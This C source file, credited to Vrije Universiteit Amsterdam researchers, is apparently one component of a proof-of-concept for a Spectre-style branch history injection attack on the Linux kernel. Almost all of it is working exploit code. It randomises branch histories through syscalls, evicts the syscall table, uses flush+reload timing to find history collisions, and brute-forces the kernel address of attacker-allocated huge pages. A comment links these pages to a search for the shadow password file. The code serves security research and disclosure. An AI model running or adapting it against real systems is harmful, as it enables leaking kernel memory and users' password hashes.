/*
 * Tuesday, May 16th 2023
 *
 * Sander Wiebing - s.j.wiebing@student.vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include "flush_and_reload.h"
#include "targets.h"
#include "../../poc-common/common.h"

#include "../../poc-common/l2_eviction/evict_sys_table_l2.h"

#include <sys/prctl.h>
#include <sys/ioctl.h>

#include <sys/time.h>
#include <sys/resource.h>

#define SYSCALL_PREAD 17

#define DEFAULT_NUMBER_OF_HUGE_PAGES 500
// Depending on the number of huge page, you increase the HP search alignment
#define DEFAULT_SEARCH_ALIGNMENT (1LU << 24)

uint64_t NUMBER_OF_HUGE_PAGES = DEFAULT_NUMBER_OF_HUGE_PAGES;
uint64_t SEARCH_ALIGNMENT = DEFAULT_SEARCH_ALIGNMENT;

extern uint64_t fill_bhb(uint8_t *history, uint64_t syscall_nr,
                     uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4);

extern uint64_t fill_bhb_fill_regs(uint8_t *history, uint64_t syscall_nr,
                                    void * reload_address);

// ----------------------------------------------------------------------------
// Huge page finding via a Birthday-like attack
//
// ----------------------------------------------------------------------------

#define NUMBER_OF_FILES 5
static char* brute_force_files[NUMBER_OF_FILES] = {
    "/proc/self/net/netfilter/nf_log",
    "/proc/self/net/arp",
    "/proc/self/net/tcp",
    "/sys/fs/cgroup/user.slice/cpu.idle",
    "/sys/fs/cgroup/cpu/cpu.idle"
};

static char read_buf[32];

__always_inline static uint8_t * collide_to_syscalls(struct config * cfg, uint64_t iterations,
                        int open_fds[], int nfd, uint8_t ** huge_pages) {

    void ** reload_addr, **start;

    for(int iter=0; iter<iterations; iter++) {

        for (int i = 0; i < NUMBER_OF_HUGE_PAGES; i++) {
            asm volatile("clflush (%0)\n"::"r"(huge_pages[i] + 512));
        }

        asm volatile("mfence");

        asm volatile("prefetcht0 (%0)" :: "r" (cfg->fr_buf_kern));

        for (int n = 0; n < nfd; n++)
        {
            fill_bhb(cfg->history, SYSCALL_PREAD, open_fds[n], (uint64_t) read_buf, 32, 0);
        #ifdef INTEL_13_GEN
            fill_bhb(cfg->history, SYSCALL_PREAD, open_fds[n], (uint64_t) read_buf, 32, 0);
        #endif
        }

        evict_sys_call_table();

        fill_bhb_fill_regs(cfg->history, VICTIM_SYSCALL, cfg->fr_buf_kern);

        asm volatile("mfence");

        start = (void **) (*(huge_pages) + 512);
        reload_addr = start;
        int idx = 0;

        // This prevents the prefetcher for touching our reloadbuffer
        do {
            if(load_time(reload_addr) < THR) {
                return huge_pages[idx];
            }
		    reload_addr = *reload_addr;
            idx += 1;
	    } while (reload_addr != start);

    }

    return 0;

}

__always_inline static uint8_t * reload_any_huge_page(struct config * cfg,
            int open_fds[], int nfd, uint8_t ** huge_pages) {

    for (size_t iter = 0; iter < COLLISION_TRIES; iter++)
    {

        for(int i=0; i<MAX_HISTORY_SIZE; i++) cfg->history[i] = rand()&1;

        uint8_t * addr = collide_to_syscalls(cfg, 5, open_fds, nfd, huge_pages);

        if (addr) {
            printf("\n>> Found huge page in %lu collision tries.\n", iter);
            return addr;
        }

    }

    return 0;

}

int find_hp_kern_address(struct config * cfg, uint64_t only_honey_pages) {

    uint64_t mem_total = get_mem_total();
    uint64_t mem_used = get_mem_used();
    uint64_t offset;

    if (mem_total > (8LU * (1LU << 30))) {
        offset = (mem_total / 10) & ~(SEARCH_ALIGNMENT - 1);
    } else {
        SEARCH_ALIGNMENT = 1LU << 22;
        NUMBER_OF_HUGE_PAGES = DEFAULT_NUMBER_OF_HUGE_PAGES / 5;
        offset = (mem_used / 4) & ~(SEARCH_ALIGNMENT - 1);
    }

    // ------------------------------------------------------------------------
    // Initialize the huge pages

    uint8_t * huge_pages[NUMBER_OF_HUGE_PAGES];
    huge_pages[0] = cfg->ind_map;


    for (int i = 1; i < NUMBER_OF_HUGE_PAGES; i++)
    {
        huge_pages[i] = allocate_huge_page();
        // Mark the huge page with the honey signature, we can use hits
        // during the shadow file search
        *(uint64_t *)huge_pages[i] = *(uint64_t *) HONEY_PAGE_SIGNATURE;
    }

    for (int i = 0; i < NUMBER_OF_HUGE_PAGES; i++) {
        *(uint8_t **)(huge_pages[i] + 512) = huge_pages[(i + 1) % NUMBER_OF_HUGE_PAGES] + 512;
    }

    if (only_honey_pages) {
        return 0;
    }

    // ------------------------------------------------------------------------
    // Open FDs

    int open_fds[NUMBER_OF_FILES];
    int n_fd = 0;
    for (int i = 0; i < NUMBER_OF_FILES; i++)
    {
        int fd = open(brute_force_files[i], O_RDONLY, 0);
        if (fd > 0) {
            open_fds[n_fd] = fd;
            n_fd++;
        }
    }


    uint8_t * huge_page_kern = cfg->phys_start + offset;
    uint8_t * huge_page_user = 0;

    // ------------------------------------------------------------------------
    // Start the huge page search


    for (; huge_page_kern < cfg->phys_end; huge_page_kern += SEARCH_ALIGNMENT)
    {
        if ((uint64_t) huge_page_kern % (SEARCH_ALIGNMENT << 2) == 0) {
            printf("\rTesting Kernel Huge Page: %p (phys_map start + %2luGB)", huge_page_kern, (huge_page_kern - cfg->phys_start) / (1 << 30));
            fflush(stdout);
        }

        cfg->fr_buf_kern = huge_page_kern + 512;


        huge_page_user = reload_any_huge_page(cfg, open_fds, n_fd, huge_pages);

        if(huge_page_user) {
            cfg->ind_map = huge_page_user;
            cfg->ind_map_kern = huge_page_kern;
            return 0;
        }

    }

    // We did not found it

    return 1;

}

// ----------------------------------------------------------------------------
// Colliding history finding with a static target history
//
// ----------------------------------------------------------------------------


int find_colliding_history(struct config * cfg) {

    uint64_t hits = 0;
    int iter = 0;

    set_load_chain_simple_touch(cfg);

    cfg->reload_addr = cfg->fr_buf;

    while(1) {
        iter++;
        if((iter % 10000) == 0){
            printf("\rTries: %d", iter);
            fflush(stdout);
        }


        for(int i=0; i<MAX_HISTORY_SIZE; i++) cfg->history[i] = rand()&1;

        hits = do_flush_and_reload(cfg, 10, 0);


        if(hits > 1) {
            printf("\n>> Found collision in %d tries (%ld/10 hits)\n", iter, hits);

            hits = do_flush_and_reload(cfg, 10000, 0);

            printf("   Verification: %ld/10000 hits\n", hits);

            if (hits < 100) {
                continue;
            }

            break;
        }

    }

}
